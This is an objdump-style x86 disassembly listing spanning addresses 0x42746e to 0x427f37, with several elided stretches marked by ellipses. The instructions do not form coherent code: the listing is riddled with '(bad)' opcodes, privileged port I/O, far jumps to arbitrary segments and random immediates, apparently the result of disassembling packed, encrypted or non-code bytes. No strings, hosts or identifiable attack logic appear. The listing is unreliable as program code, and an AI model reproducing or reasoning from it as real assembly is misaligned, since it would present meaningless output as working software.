  42746e:	jb     0x42744d
  427470:	sub    bl,ah
  427472:	daa    
  427473:	sbb    eax,DWORD PTR [edi+0x17]
  427476:	push   ss
  427477:	jp     0x427406
  427479:	sti    
  42747a:	(bad)  
  42747b:	scas   eax,DWORD PTR es:[edi]
  42747c:	in     eax,dx
  42747d:	fcom   DWORD PTR ds:0xbc0b6be0
  427483:	hlt    
  427484:	dec    edx
  427485:	push   edi
  427486:	push   es
  427487:	ins    DWORD PTR es:[edi],dx
  427488:	jge    0x4274f8
  42748a:	mov    ?,WORD PTR [ecx-0x65]
  42748d:	or     BYTE PTR [edi-0x2c],dh
  427490:	dec    ebp
  427491:	adc    BYTE PTR [edi+0x20],0x35
  427495:	pop    ss
  427496:	or     eax,0x5adac7df
  42749b:	cmovs  ebp,DWORD PTR [eax-0x153c5949]
  4274a2:	dec    esp
  4274a3:	jne    0x4274c2
  4274a5:	sub    eax,0xa80c7abe
  4274aa:	lds    esi,FWORD PTR ds:0x5940b9f0
  4274b0:	les    ebx,FWORD PTR [edi-0x35]
  4274b3:	xor    eax,0x71c95aac
  4274b8:	fs cmp esp,ebx
  4274bb:	jge    0x42745a
  4274bd:	retf   0x81ad
  4274c0:	push   esi
  4274c1:	imul   esp,DWORD PTR [ecx+0x2c],0x5a
  4274c5:	retf   0xc8f1
  4274c8:	(bad)
  4274cd:	icebp  
  4274ce:	xchg   ebx,eax
  4274cf:	pop    es
  4274d0:	pop    ecx
  4274d1:	popf   
  4274d2:	push   ds
  4274d3:	inc    edx
  4274d4:	pushf  
  4274d5:	hlt    
  4274d6:	mov    eax,ds:0xf4a5ca6
  4274db:	in     eax,0xfa
  4274dd:	sbb    al,0xea
  4274df:	sub    eax,0x59fcd954
  4274e4:	call   0x6987bcab
  4274e9:	mov    eax,ds:0xc27b162
  4274ee:	mov    dh,0x5c
  4274f0:	sbb    eax,DWORD PTR [edi+eiz*2-0x7c]
  4274f4:	in     al,0xbc
  4274f6:	jl     0x42747e
  4274f8:	ret    
  4274f9:	push   0xffffffe3
  4274fb:	adc    dl,BYTE PTR [edi+eax*8+0x65dcb66b]
  427502:	ret    0x5be1
  427505:	shl    ch,0x29
  427508:	jmp    0x37e8:0xcc2d0d22
  42750f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427510:	mov    ds:0x948a8e25,al
  427515:	mov    ah,BYTE PTR [eax-0x52]
  427518:	rol    eax,cl
  42751a:	jne    0x42751e
  42751c:	or     eax,0x7fd78fc9
  427521:	cmp    DWORD PTR [ecx-0x34],edx
  427524:	and    al,0x34
  427526:	cmp    ebx,edx
  427528:	scas   al,BYTE PTR es:[edi]
  427529:	sub    ecx,DWORD PTR [edi-0x672d2476]
  42752f:	pop    ss
  427530:	dec    eax
  427531:	int    0xab
  427533:	mov    bh,0x54
  427535:	sbb    al,BYTE PTR [eax]
  427537:	out    dx,al
  427538:	xchg   ecx,eax
  427539:	mov    DWORD PTR [ecx+0x4943a208],edx
  42753f:	mov    ecx,0xc352
	...
  4275b4:	adc    cl,bl
  4275b6:	sbb    DWORD PTR [edx],0xcb9b5ad9
  4275bc:	mov    ds:0x339a8b87,al
  4275c1:	mov    ds:0xa2da354d,al
  4275c6:	add    DWORD PTR [eax],eax
  4275c8:	test   BYTE PTR [eax],0x0
  4275cb:	add    BYTE PTR ds:0xe1abc056,dh
  4275d1:	pop    esi
  4275d2:	pop    ds
  4275d3:	push   ebx
  4275d4:	or     DWORD PTR [esi+ebp*8+0x28],ecx
  4275d8:	jns    0x427610
  4275da:	sub    dl,cl
  4275dc:	mov    ah,0x1b
  4275de:	call   0x21525995
  4275e3:	add    BYTE PTR [eax+0x48],0x55
  4275e7:	daa    
  4275e8:	add    DWORD PTR [edx+0x46],esp
  4275eb:	push   eax
  4275ec:	fld    DWORD PTR ds:0x91b96a03
  4275f2:	xor    dl,BYTE PTR [ebx-0x19acb918]
  4275f8:	inc    edx
  4275f9:	mov    ch,0x4a
  4275fb:	mov    ah,0x1
  4275fd:	lock and DWORD PTR [esi],eax
  427600:	cmp    esp,0xffffff9b
  427603:	out    0xcc,al
  427605:	xor    BYTE PTR [edi+0x3f],dh
  427608:	(bad)
  42760b:	mov    al,0xd6
  42760d:	pop    ebp
  42760e:	fs cmp al,0xfc
  427611:	mov    bh,0xd3
  427613:	out    0xa4,eax
  427615:	dec    ecx
  427616:	push   es
  427617:	std    
  427618:	ja     0x4275b6
  42761a:	ficomp DWORD PTR [ecx*1-0x4f958ae0]
  427621:	jmp    0x427685
  427623:	mov    ebp,0xf7bb6026
  427628:	loopne 0x427694
  42762a:	inc    edi
  42762b:	popa   
  42762c:	repz shr ebp,1
  42762f:	jns    0x427686
  427631:	not    DWORD PTR [ebx-0x26af70c5]
  427637:	adc    esi,DWORD PTR ds:0xc5ed8d74
  42763d:	xchg   ecx,eax
  42763e:	cmp    eax,DWORD PTR [edx+0x2dbc296f]
  427644:	arpl   WORD PTR [ebx+0x36],di
  427647:	mov    BYTE PTR [esi-0x3],ah
  42764a:	cmp    BYTE PTR [esi+0x39d775d4],0x68
  427651:	ja     0x427625
  427653:	jge    0x4276b5
  427655:	daa    
  427656:	(bad)  
  427657:	nop
  427658:	icebp  
  427659:	arpl   WORD PTR [ebx],ax
  42765b:	mov    esi,0xd3a332bb
  427660:	xchg   BYTE PTR [ecx],ah
  427662:	daa    
  427663:	ds adc eax,0x2486eda4
  427669:	aad    0xd0
  42766b:	lods   al,BYTE PTR ds:[esi]
  42766c:	je     0x427652
  42766e:	and    BYTE PTR [ebp+0x49739772],dh
  427674:	outs   dx,BYTE PTR ds:[esi]
  427675:	inc    eax
  427676:	xchg   ebx,eax
  427677:	fdiv   st(2),st
  427679:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42767a:	mov    eax,0x2c2ecea9
  42767f:	jb     0x427628
  427681:	inc    ebp
  427682:	pop    ecx
  427683:	std    
  427684:	jns    0x4276c2
  427686:	jge    0x427698
  427688:	mov    esp,0x16489e46
  42768d:	jge    0x4276c7
  42768f:	push   ecx
  427690:	adc    DWORD PTR [ecx],0xffffff95
  427693:	dec    eax
  427694:	xchg   esi,eax
  427695:	add    DWORD PTR [edx-0x32],edi
  427698:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427699:	jae    0x427635
  42769b:	in     al,0xfd
  42769d:	call   0x75a5ca2c
  4276a2:	jb     0x427723
  4276a4:	fist   WORD PTR [ecx-0x4d]
  4276a7:	push   esi
  4276a8:	xor    BYTE PTR [eax-0x15],ah
  4276ab:	fdiv   QWORD PTR [ebx+0x31]
  4276ae:	andps  xmm0,XMMWORD PTR [esi]
  4276b1:	cmp    dh,BYTE PTR [edx]
  4276b3:	cli    
  4276b4:	(bad)  
  4276b5:	sti    
  4276b6:	and    DWORD PTR [ebp+0x5539eca],ecx
  4276bc:	pop    eax
  4276bd:	outs   dx,BYTE PTR ds:[esi]
  4276be:	pop    es
  4276bf:	mov    ds:0x17f6,eax
	...
  427734:	mov    eax,0xff2ace8d
  427739:	imul   edi,esp,0xffffff9f
  42773c:	and    al,0x37
  42773e:	or     al,0x49
  427740:	xchg   BYTE PTR [ebx-0x55],bl
  427743:	in     al,0xd0
  427745:	mov    ds:0xf60001,eax
  42774a:	add    BYTE PTR [eax],al
  42774c:	ret    
  42774d:	daa    
  42774e:	mov    ch,0xd7
  427750:	xchg   BYTE PTR [ebx+0x21d0a66a],al
  427756:	fwait
  427757:	cdq    
  427758:	xlat   BYTE PTR ds:[ebx]
  427759:	not    DWORD PTR [esi]
  42775b:	jmp    FWORD PTR [eax-0x4fd65c5b]
  427761:	sub    ebp,DWORD PTR [eax]
  427763:	popa   
  427764:	pop    eax
  427765:	dec    ecx
  427766:	cmp    eax,0x87314e73
  42776b:	pop    edi
  42776c:	sbb    eax,0xe523dda9
  427771:	xor    al,0xc6
  427773:	adc    DWORD PTR [esi],ecx
  427775:	out    0x2b,eax
  427777:	jns    0x4277bb
  427779:	cwde   
  42777a:	add    ah,BYTE PTR [edi-0x48]
  42777d:	test   BYTE PTR [ebx+0x73],bh
  427780:	push   ebx
  427781:	bsr    ecx,DWORD PTR [ebx-0x22203f96]
  427788:	adc    eax,0x5c8df1cb
  42778d:	mov    ebp,DWORD PTR [edx+0x7c]
  427790:	sub    DWORD PTR [esi+0x3f],edx
  427793:	push   esp
  427794:	lock dec edx
  427797:	lock push 0x17e62ff4
  42779d:	popf   
  42779e:	test   BYTE PTR [esi],0x70
  4277a1:	in     eax,0xa6
  4277a3:	jmp    0xb9992b9e
  4277a8:	(bad)  
  4277a9:	in     al,dx
  4277aa:	pusha  
  4277ab:	fmul   st,st(2)
  4277ad:	adc    eax,0x6fea9de4
  4277b2:	mov    ds,edx
  4277b4:	dec    ebx
  4277b5:	sub    DWORD PTR [esi-0x18],0x291cfc20
  4277bc:	int    0x66
  4277be:	inc    esp
  4277bf:	scas   eax,DWORD PTR es:[edi]
  4277c0:	pop    esi
  4277c1:	and    eax,0x8add70f8
  4277c6:	dec    ebx
  4277c7:	and    eax,0x9ff0514f
  4277cc:	mov    ecx,0x2bcac1ad
  4277d1:	stos   DWORD PTR es:[edi],eax
  4277d2:	ret    
  4277d3:	add    cl,dh
  4277d5:	mov    ecx,0x509eb55d
  4277da:	and    DWORD PTR [ecx-0xd],esp
  4277dd:	ficom  DWORD PTR [ecx]
  4277df:	js     0x427818
  4277e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4277e2:	xchg   ebp,eax
  4277e3:	cli    
  4277e4:	int    0x5b
  4277e6:	es int3 
  4277e8:	and    ebp,eax
  4277ea:	je     0x42784f
  4277ec:	repnz mov ebx,0xb7e17d33
  4277f2:	or     eax,0xc804eedb
  4277f7:	add    BYTE PTR [eax],bh
  4277f9:	xchg   BYTE PTR [ecx-0x354dacb7],bl
  4277ff:	pop    eax
  427800:	jb     0x427844
  427802:	(bad)  
  427804:	mov    ah,0xac
  427806:	repnz mov eax,0x1b85fede
  42780c:	xor    eax,0x54a33319
  427811:	cld    
  427812:	cmc    
  427813:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427814:	mov    ecx,DWORD PTR [esi]
  427816:	test   eax,0x4be46765
  42781b:	hlt    
  42781c:	jnp    0x427834
  42781e:	sti    
  42781f:	cdq    
  427820:	fst    QWORD PTR [ebx]
  427822:	add    al,0x1a
  427824:	stos   BYTE PTR es:[edi],al
  427825:	psrad  mm4,QWORD PTR [esp+ecx*1+0x5d28947d]
  42782d:	inc    esp
  42782e:	adc    ch,BYTE PTR [ecx-0x65]
  427831:	mov    ebp,0xe0763f19
  427836:	pop    ss
  427837:	mov    ch,0x5b
  427839:	sar    ah,1
  42783b:	add    ecx,eax
  42783d:	mov    DWORD PTR [ecx+0x3a4f5],esi
	...
  4278b3:	add    BYTE PTR [esi+ecx*2+0x7fff7d7d],cl
  4278ba:	mov    edi,?
  4278bc:	dec    eax
  4278bd:	mov    ds:0x8637918f,al
  4278c2:	xchg   edi,eax
  4278c3:	adc    esi,eax
  4278c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4278c6:	add    DWORD PTR [eax],eax
  4278c8:	test   BYTE PTR [eax],0x0
  4278cb:	add    BYTE PTR [esi+0x256f7e05],ch
  4278d1:	inc    esi
  4278d2:	lahf   
  4278d3:	outs   dx,DWORD PTR ds:[esi]
  4278d4:	mov    al,0x91
  4278d6:	xor    al,0xde
  4278d8:	inc    ebx
  4278d9:	mov    edx,0xd2c562ed
  4278de:	dec    ecx
  4278df:	mov    eax,ds:0xcb4fe152
  4278e4:	push   eax
  4278e5:	enter  0x795,0x9
  4278e9:	mov    dl,0x6a
  4278eb:	push   edi
  4278ec:	sub    eax,0x8a7c7a9e
  4278f1:	jo     0x427922
  4278f3:	call   0xdacb:0x8db50e58
  4278fa:	lods   eax,DWORD PTR ds:[esi]
  4278fb:	sahf   
  4278fc:	mov    eax,ds:0x5ec73b15
  427901:	mov    ah,0x3c
  427903:	std    
  427904:	sub    BYTE PTR [ebx-0x68],0xf2
  427908:	dec    eax
  427909:	mov    al,0xff
  42790b:	mov    esi,DWORD PTR ds:0x37bd392f
  427911:	test   DWORD PTR ds:0x6ab43a5,esp
  427917:	and    BYTE PTR [ebp+0x78a525ff],0x78
  42791e:	xor    BYTE PTR [edi-0x75b38670],bl
  427924:	(bad)  
  427925:	jmp    0xfc71a8d8
  42792a:	lods   al,BYTE PTR ds:[esi]
  42792b:	jecxz  0x42792a
  42792d:	xchg   BYTE PTR [ebx+esi*8],ch
  427930:	(bad)  
  427931:	lock sbb eax,0x4c2485cb
  427937:	inc    ecx
  427938:	or     BYTE PTR [esi-0x5d],0xe6
  42793c:	fdiv   DWORD PTR [edx]
  42793e:	xchg   ebp,eax
  42793f:	es push esi
  427941:	cs add al,0x17
  427944:	or     BYTE PTR [ebp+0x52],cl
  427947:	out    0x5d,eax
  427949:	mov    edi,0x5ac1f706
  42794e:	ret    
  42794f:	push   edx
  427950:	sbb    DWORD PTR [ecx+0x42fac1eb],ebp
  427956:	adc    esp,edi
  427958:	cmp    esi,DWORD PTR [edx-0x5e]
  42795b:	or     eax,0x8e6dd1e6
  427960:	xor    BYTE PTR [esi+0x6f1ad7b0],cl
  427966:	add    dl,BYTE PTR [ebp+eax*8-0x1dafedb7]
  42796d:	mov    ebx,ecx
  42796f:	pop    ebp
  427970:	mov    ds,WORD PTR [ecx]
  427972:	rol    DWORD PTR [ebp+0x37],0xf9
  427976:	sub    bl,ah
  427978:	pop    ecx
  427979:	es aaa 
  42797b:	xchg   ebp,eax
  42797c:	lods   eax,DWORD PTR ds:[esi]
  42797d:	and    DWORD PTR [edx-0x36d6066e],eax
  427983:	into   
  427984:	iret   
  427985:	push   0x4
  427987:	(bad)  
  427988:	in     al,dx
  427989:	xor    DWORD PTR [eax],ebx
  42798b:	mov    ecx,0x6b8c6689
  427990:	sub    DWORD PTR [edi-0x576d18b9],esi
  427996:	lea    ebp,[ecx+edx*4]
  427999:	jle    0x427949
  42799b:	add    BYTE PTR [ebp-0x167da8c0],cl
  4279a1:	fld    TBYTE PTR ds:0x189ee24a
  4279a7:	and    eax,0x42510f18
  4279ac:	jmp    0x4279ca
  4279ae:	xlat   BYTE PTR ds:[ebx]
  4279af:	xchg   esi,eax
  4279b0:	popa   
  4279b1:	xchg   edi,edx
  4279b3:	je     0x427991
  4279b5:	inc    edi
  4279b6:	and    eax,DWORD PTR [edi+0x66]
  4279b9:	aad    0xc9
  4279bb:	adc    esp,DWORD PTR [edx]
  4279bd:	pushf  
  4279be:	xor    BYTE PTR [esi+0xe276],bh
	...
  427a34:	cdq    
  427a35:	sub    BYTE PTR ds:0xdb77bd56,cl
  427a3b:	out    dx,eax
  427a3c:	das    
  427a3d:	mov    ch,0xeb
  427a3f:	aam    0x32
  427a41:	repnz hlt 
  427a43:	out    dx,al
  427a44:	mov    esp,0xf60001a5
  427a49:	add    BYTE PTR [eax],al
  427a4b:	add    dh,bl
  427a4d:	test   al,0x83
  427a4f:	xor    esp,ecx
  427a51:	pop    ebx
  427a52:	cdq    
  427a53:	push   esi
  427a54:	dec    BYTE PTR ds:0x30ccdbdd
  427a5a:	dec    edi
  427a5b:	cmp    BYTE PTR [ebx-0x21],bh
  427a5e:	fcmove st,st(2)
  427a60:	cs jbe 0x427a69
  427a63:	dec    eax
  427a64:	cli    
  427a65:	jne    0x427ab4
  427a67:	loopne 0x427a12
  427a69:	outs   dx,DWORD PTR ds:[esi]
  427a6a:	scas   eax,DWORD PTR es:[edi]
  427a6b:	std    
  427a6c:	into   
  427a6d:	mov    ebx,0x1c462b4f
  427a72:	je     0x427a0d
  427a74:	jo     0x427a42
  427a76:	push   esp
  427a77:	test   DWORD PTR [edx],edi
  427a79:	and    BYTE PTR [esi+edi*8-0x5d],bl
  427a7d:	adc    ch,ah
  427a7f:	scas   eax,DWORD PTR es:[edi]
  427a80:	inc    ebx
  427a81:	dec    esi
  427a82:	xchg   BYTE PTR [esi-0x2c885ba5],bh
  427a88:	cmp    ebp,DWORD PTR [ebp+esi*1+0x659afbb1]
  427a8f:	cld    
  427a90:	(bad)  
  427a92:	test   al,0x7c
  427a94:	cmp    eax,0xeb98cc6a
  427a99:	push   0xffffff89
  427a9b:	pop    ebp
  427a9c:	mov    eax,0x5330c169
  427aa1:	fnstsw WORD PTR [ecx]
  427aa3:	(bad)  
  427aa4:	ds cdq 
  427aa6:	(bad)  
  427aa7:	mov    eax,0x7beb1b50
  427aac:	(bad)  
  427aad:	in     al,0xf9
  427aaf:	jle    0x427a68
  427ab1:	or     eax,0x110e4361
  427ab6:	push   cs
  427ab7:	push   0xffffffdd
  427ab9:	retf   
  427aba:	xchg   esi,eax
  427abb:	add    al,0xc2
  427abd:	xchg   esi,eax
  427abe:	pop    ss
  427abf:	popf   
  427ac0:	les    ecx,FWORD PTR [edx+eax*8+0x2279589b]
  427ac7:	in     eax,dx
  427ac8:	jle    0x427a83
  427aca:	xlat   BYTE PTR ds:[ebx]
  427acb:	(bad)  
  427acc:	pop    ss
  427acd:	clc    
  427ace:	add    ah,BYTE PTR [esp+ebp*4-0x6e]
  427ad2:	jg     0x427a7f
  427ad4:	jge    0x427b0f
  427ad6:	es add ch,dh
  427ad9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427ada:	pop    ebp
  427adb:	mov    esi,0xab55033c
  427ae0:	add    edx,DWORD PTR [esi-0x70]
  427ae3:	ja     0x427b4e
  427ae5:	pusha  
  427ae6:	fs adc al,0xca
  427ae9:	push   ebx
  427aea:	xchg   ecx,eax
  427aeb:	std    
  427aec:	pop    ecx
  427aed:	jns    0x427b25
  427aef:	xor    ch,cl
  427af1:	add    ch,cl
  427af3:	mov    bl,0x8c
  427af5:	push   es
  427af6:	add    al,0xee
  427af8:	outs   dx,DWORD PTR ds:[esi]
  427af9:	nop
  427afa:	sbb    DWORD PTR [edx],esi
  427afc:	loopne 0x427a9f
  427afe:	and    ecx,DWORD PTR [esi-0x5f]
  427b01:	dec    ebp
  427b02:	jmp    0x6c1c:0x4ea2130
  427b09:	aas    
  427b0a:	mov    dl,0x67
  427b0c:	aas    
  427b0d:	jle    0x427b5d
  427b0f:	add    DWORD PTR [eax],ebx
  427b11:	fnstcw WORD PTR [edx+0x2e669bf0]
  427b17:	lea    edx,[edx+ebx*2-0x47739923]
  427b1e:	pop    ecx
  427b1f:	mov    ecx,0xd33f3185
  427b24:	mov    dh,0x5
  427b26:	jecxz  0x427b29
  427b28:	jbe    0x427b8b
  427b2a:	adc    esi,DWORD PTR [eax-0x48]
  427b2d:	xor    dh,BYTE PTR [edi+0x21d48561]
  427b33:	push   esp
  427b34:	dec    esp
  427b35:	sub    eax,0xce7b2efc
  427b3a:	add    al,0x32
  427b3c:	fidivr WORD PTR [eax+edx*2]
  427b3f:	add    dh,bl
  427b41:	push   0x0
	...
  427bb2:	add    BYTE PTR [eax],al
  427bb4:	loop   0x427c16
  427bb6:	test   DWORD PTR [esi+0x74f3f787],esi
  427bbc:	mov    eax,0xbc14fe65
  427bc1:	mov    ds:0xa6b2e909,eax
  427bc6:	add    DWORD PTR [eax],eax
  427bc8:	test   BYTE PTR [eax],0x0
  427bcb:	add    BYTE PTR [ebx-0x17],ch
  427bce:	inc    ebx
  427bcf:	jb     0x427bda
  427bd1:	pop    ebx
  427bd2:	loope  0x427be3
  427bd4:	add    BYTE PTR [edx],dl
  427bd6:	adc    eax,0x79918615
  427bdb:	fsubr  QWORD PTR [esi+ebx*8-0x59]
  427bdf:	mov    DWORD PTR [esi-0x56],eax
  427be2:	cmp    edi,DWORD PTR [ecx-0x6b08e611]
  427be8:	push   eax
  427be9:	int3   
  427bea:	jecxz  0x427bdb
  427bec:	jo     0x427c08
  427bee:	fisttp DWORD PTR [ebx+0x4]
  427bf1:	inc    ebp
  427bf2:	cwde   
  427bf3:	in     eax,dx
  427bf4:	aad    0xe0
  427bf6:	icebp  
  427bf7:	pop    eax
  427bf8:	inc    eax
  427bf9:	cli    
  427bfa:	pop    ss
  427bfb:	inc    esi
  427bfc:	pop    ss
  427bfd:	stos   BYTE PTR es:[edi],al
  427bfe:	add    dl,BYTE PTR [ebp+edi*1-0x7432dbf6]
  427c05:	ins    BYTE PTR es:[edi],dx
  427c06:	pop    ebx
  427c07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427c08:	into   
  427c09:	test   DWORD PTR ds:0x91af6a1e,esi
  427c0f:	rcr    BYTE PTR [edi+ebx*2+0x77],1
  427c13:	mov    esi,0x20ee7ade
  427c18:	cmp    al,BYTE PTR [ecx-0xd05d254]
  427c1e:	jle    0x427c0f
  427c20:	fstp   TBYTE PTR [edi-0x67]
  427c23:	into   
  427c24:	les    ebp,FWORD PTR [esi+edx*1]
  427c27:	jb     0x427c1f
  427c29:	retf   
  427c2a:	push   0xa4e00ec6
  427c2f:	push   ebx
  427c30:	push   ecx
  427c32:	jbe    0x427c4e
  427c34:	test   ebp,esi
  427c36:	pop    esp
  427c37:	push   edi
  427c38:	jmp    0xb823:0xd086bab2
  427c3f:	pushf  
  427c40:	sbb    eax,0xf014c10c
  427c45:	dec    ebx
  427c46:	stos   DWORD PTR es:[edi],eax
  427c47:	fwait
  427c48:	inc    ebp
  427c49:	les    ebx,FWORD PTR [eax]
  427c4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427c4c:	xchg   esp,eax
  427c4d:	jge    0x427c07
  427c4f:	inc    ecx
  427c50:	xchg   bl,ah
  427c52:	push   es
  427c53:	add    eax,0xd5a833c8
  427c58:	data16 adc dh,bh
  427c5b:	mov    ds:0x534ae04a,al
  427c60:	sub    DWORD PTR [ecx-0x5d72351f],edi
  427c66:	pop    ebx
  427c67:	cdq    
  427c68:	test   al,0x90
  427c6a:	pop    edx
  427c6b:	(bad)  
  427c6c:	dec    eax
  427c6d:	inc    esp
  427c6e:	hlt    
  427c6f:	std    
  427c70:	lahf   
  427c71:	cmc    
  427c72:	sub    ebp,esi
  427c74:	mov    ax,fs:0x2692569a
  427c7b:	retf   0xc04b
  427c7e:	retf   0x6203
  427c81:	xlat   BYTE PTR ds:[ebx]
  427c82:	push   ecx
  427c83:	sub    al,0xa7
  427c85:	clc    
  427c86:	pop    ebp
  427c87:	jno    0x427c86
  427c89:	cmc    
  427c8a:	mov    edx,0xeb3e437c
  427c8f:	mov    esi,0x9cc8ea88
  427c94:	add    ah,bh
  427c96:	push   esp
  427c97:	in     eax,0xa4
  427c99:	sub    al,ch
  427c9b:	fnsave [edi+eiz*1+0x50b57c80]
  427ca2:	imul   esi,DWORD PTR [ecx-0x2eb953be],0xfffffff5
  427ca9:	jo     0x427ca5
  427cab:	aam    0xba
  427cad:	mov    ch,0x41
  427caf:	add    ah,BYTE PTR [ebp-0x40a489c6]
  427cb5:	xchg   ebx,eax
  427cb6:	add    ch,dl
  427cb8:	mov    cl,0x7
  427cba:	iret   
  427cbb:	test   BYTE PTR [eax],al
  427cbd:	push   0xd2cfb8a6
	...
  427d32:	add    BYTE PTR [eax],al
  427d34:	or     dh,BYTE PTR [ecx-0xc040c9f]
  427d3a:	call   0xeba1:0xdc63ecf9
  427d41:	xchg   ecx,eax
  427d42:	add    ah,BYTE PTR [eax+ebp*4]
  427d45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427d46:	add    DWORD PTR [eax],eax
  427d48:	test   BYTE PTR [eax],0x0
  427d4b:	add    BYTE PTR [ebx],bh
  427d4d:	stos   DWORD PTR es:[edi],eax
  427d4e:	fimul  WORD PTR [eax]
  427d50:	int3   
  427d51:	test   al,0xb1
  427d53:	xchg   edi,eax
  427d54:	into   
  427d55:	(bad)  
  427d56:	jecxz  0x427d09
  427d58:	nop
  427d59:	dec    edi
  427d5a:	mov    ds:0x9deb4d8b,eax
  427d5f:	aad    0x5e
  427d61:	cmp    al,0xaf
  427d63:	fsub   st,st(0)
  427d65:	xchg   edx,eax
  427d66:	ror    BYTE PTR [eax+0x68],0x98
  427d6a:	fisubr DWORD PTR [esi+0x38]
  427d6d:	in     al,0x8f
  427d6f:	cmp    ecx,edi
  427d71:	push   edx
  427d72:	xor    bl,al
  427d74:	mov    dh,0xeb
  427d76:	lahf   
  427d77:	test   al,0x8d
  427d79:	push   edi
  427d7a:	push   edx
  427d7b:	mov    ch,0x7c
  427d7d:	dec    esi
  427d7e:	test   al,0xf1
  427d80:	or     eax,0xa44037cd
  427d85:	mov    al,0x2
  427d87:	mov    edi,0x1ea427b6
  427d8c:	je     0x427d84
  427d8e:	and    BYTE PTR ds:0xce96dff3,dl
  427d94:	cmp    ecx,DWORD PTR [ecx]
  427d96:	in     eax,0x35
  427d98:	add    DWORD PTR [esi],eax
  427d9a:	nop
  427d9b:	or     esp,DWORD PTR [ecx+0x76b70bc4]
  427da1:	popa   
  427da2:	or     eax,0x74c0dee0
  427da7:	mov    ?,WORD PTR [ebp+esi*1+0xe]
  427dab:	jnp    0x427d6a
  427dad:	push   0xffffffc8
  427daf:	lods   eax,DWORD PTR ds:[esi]
  427db0:	push   eax
  427db1:	in     eax,dx
  427db2:	pop    ecx
  427db3:	in     al,0x99
  427db5:	push   eax
  427db6:	iret   
  427db7:	imul   eax,DWORD PTR [eax-0x6112e215],0xfffffff6
  427dbe:	shr    BYTE PTR [ebx+0x63163d30],1
  427dc4:	xor    dl,bh
  427dc6:	imul   BYTE PTR [edi+0x66eefcfa]
  427dcc:	fs aas 
  427dce:	inc    ebp
  427dcf:	xchg   esi,eax
  427dd0:	aad    0x74
  427dd2:	in     eax,0x53
  427dd4:	jnp    0x427dac
  427dd6:	dec    ebx
  427dd7:	icebp  
  427dd8:	dec    esp
  427dd9:	ss xchg edi,eax
  427ddb:	add    BYTE PTR [edi+0x5b69a0c4],bh
  427de1:	cld    
  427de2:	stc    
  427de3:	mov    ah,0x32
  427de5:	js     0x427e0c
  427de7:	inc    ecx
  427de8:	add    bl,BYTE PTR [edx+0x2b269a99]
  427dee:	ret    0x5f4e
  427df1:	ficom  WORD PTR [ebp-0x4b]
  427df4:	call   FWORD PTR [eax+0x39]
  427df7:	cmp    DWORD PTR [ecx+0x4f],edx
  427dfa:	test   esp,edx
  427dfc:	dec    ebp
  427dfd:	push   ds
  427dfe:	call   0xc460640b
  427e03:	adc    BYTE PTR [esp+ebx*2-0x55],bl
  427e07:	lahf   
  427e08:	enter  0xb036,0xe8
  427e0c:	mov    dh,0x34
  427e0e:	xlat   BYTE PTR ds:[ebx]
  427e0f:	loopne 0x427dd0
  427e11:	mov    dl,0x58
  427e13:	(bad)  
  427e15:	push   edi
  427e16:	sbb    DWORD PTR [edx-0x31],eax
  427e19:	pop    edi
  427e1a:	jbe    0x427e3a
  427e1c:	in     eax,0x72
  427e1e:	pop    eax
  427e1f:	stos   BYTE PTR es:[edi],al
  427e20:	dec    ebp
  427e21:	outs   dx,DWORD PTR ds:[esi]
  427e22:	xlat   BYTE PTR ds:[ebx]
  427e23:	adc    DWORD PTR [ebp-0x1bfae282],edi
  427e29:	xchg   ecx,eax
  427e2a:	leave  
  427e2b:	dec    esp
  427e2c:	(bad)  
  427e2d:	test   al,0x9a
  427e2f:	jno    0x427dca
  427e31:	pop    edi
  427e32:	ins    DWORD PTR es:[edi],dx
  427e33:	retf   
  427e34:	add    DWORD PTR [eax],edx
  427e36:	jecxz  0x427de9
  427e38:	xchg   ebp,eax
  427e39:	adc    BYTE PTR [eax+0xb85d2e9],0xfe
  427e40:	adc    eax,0xca
	...
  427eb1:	add    BYTE PTR [eax],al
  427eb3:	add    BYTE PTR [edx+eiz*4-0xa380e39],ah
  427eba:	mov    dh,0xf7
  427ebc:	mov    ebx,esi
  427ebe:	cmp    ebx,edx
  427ec0:	(bad)  
  427ec1:	ins    DWORD PTR es:[edi],dx
  427ec2:	cmp    ecx,DWORD PTR [eax]
  427ec4:	sahf   
  427ec5:	test   al,0x1
  427ec7:	add    dh,dh
  427ec9:	add    BYTE PTR [eax],al
  427ecb:	add    BYTE PTR [edi+ebp*2],bh
  427ece:	cmc    
  427ecf:	std    
  427ed0:	js     0x427ed8
  427ed2:	stc    
  427ed3:	cmp    eax,0x444a31b7
  427ed8:	ins    DWORD PTR es:[edi],dx
  427ed9:	aam    0x73
  427edb:	out    dx,al
  427edc:	sbb    edx,DWORD PTR [eax+0x12]
  427edf:	adc    BYTE PTR [ebp+0x23ca6d73],bl
  427ee5:	test   DWORD PTR [ebx],ebx
  427ee7:	adc    DWORD PTR [esi-0x674bf11c],esp
  427eed:	xor    BYTE PTR [ebp-0x80],dl
  427ef0:	xor    eax,0x35b1107a
  427ef5:	test   BYTE PTR [edi+0xa],bh
  427ef8:	jp     0x427f55
  427efa:	aas    
  427efb:	mov    al,0xfb
  427efd:	mov    ds:0xc9453658,eax
  427f02:	xchg   edx,eax
  427f03:	xchg   edx,eax
  427f04:	xor    al,0xd7
  427f06:	int    0x4d
  427f08:	cli    
  427f09:	sbb    al,0x4e
  427f0b:	ja     0x427eb2
  427f0d:	int3   
  427f0e:	inc    esp
  427f0f:	jle    0x427e9e
  427f11:	xchg   edx,ebp
  427f13:	push   0x1a
  427f15:	popf   
  427f16:	cmp    eax,0x333cc41b
  427f1b:	or     al,0x78
  427f1e:	lds    edx,FWORD PTR [ecx-0x56]
  427f21:	cmp    al,0xb
  427f23:	adc    ah,ah
  427f25:	rcl    edi,1
  427f27:	scas   al,BYTE PTR es:[edi]
  427f28:	test   eax,ebp
  427f2a:	inc    ecx
  427f2b:	push   eax
  427f2c:	mov    bh,0xa
  427f2e:	dec    esi
  427f2f:	cld    
  427f30:	ficomp DWORD PTR [ecx+edx*4+0x2ecedb77]
  427f37:	jecxz  0x427eca
